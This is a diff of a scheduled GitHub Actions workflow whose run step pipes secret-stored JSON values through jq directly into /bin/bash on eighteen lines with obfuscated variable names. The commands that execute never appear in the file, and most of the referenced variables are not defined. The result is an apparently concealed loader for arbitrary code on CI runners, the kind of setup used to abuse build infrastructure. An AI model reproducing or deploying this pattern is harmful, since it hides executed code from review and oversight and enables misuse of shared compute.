@@ -1,8 +1,10 @@
 name: muhong19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '4 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +13,24 @@ jobs:
       - uses: actions/checkout@v4
       - name: muhong19871010
         env:
-          kzo9: ${{ secrets.kzo9 }}
+          jjkk98067: ${{ secrets.jjkk98067 }}
         run: |
-          echo $kzo9 | jq -r .zb6 | /bin/bash
-          echo $jbx15 | jq -r .nhlur643 | /bin/bash
-          echo $agx14 | jq -r .xeye0 | /bin/bash
-          echo $ppyyv84823 | jq -r .koovp677 | /bin/bash
-          echo $iuid855 | jq -r .pdjjc9 | /bin/bash
-          echo $vqzfh25 | jq -r .bu14771 | /bin/bash
-          echo $yh15 | jq -r .s976 | /bin/bash
-          echo $nevk33981 | jq -r .pn9 | /bin/bash
+          echo $jjkk98067 | jq -r .rmui844 | /bin/bash
+          echo $w7432 | jq -r .yi797 | /bin/bash
+          echo $xx8079 | jq -r .qi2265 | /bin/bash
+          echo $czul605 | jq -r .lah23115 | /bin/bash
+          echo $qzurr63029 | jq -r .soa005 | /bin/bash
+          echo $xzhm681 | jq -r .w700 | /bin/bash
+          echo $l0 | jq -r .avczc6597 | /bin/bash
+          echo $x17404 | jq -r .gsus52525 | /bin/bash
+          echo $cxx08 | jq -r .oo030 | /bin/bash
+          echo $gge10 | jq -r .y4 | /bin/bash
+          echo $a1018 | jq -r .hsb74 | /bin/bash
+          echo $rqq359 | jq -r .adunq44489 | /bin/bash
+          echo $n0618 | jq -r .ko3304 | /bin/bash
+          echo $uglr62310 | jq -r .tulf56271 | /bin/bash
+          echo $o163 | jq -r .imr8555 | /bin/bash
+          echo $ofyh338 | jq -r .utu8371 | /bin/bash
+          echo $lrd07 | jq -r .gsxw48126 | /bin/bash
+          echo $qua61 | jq -r .qxg8245 | /bin/bash
 
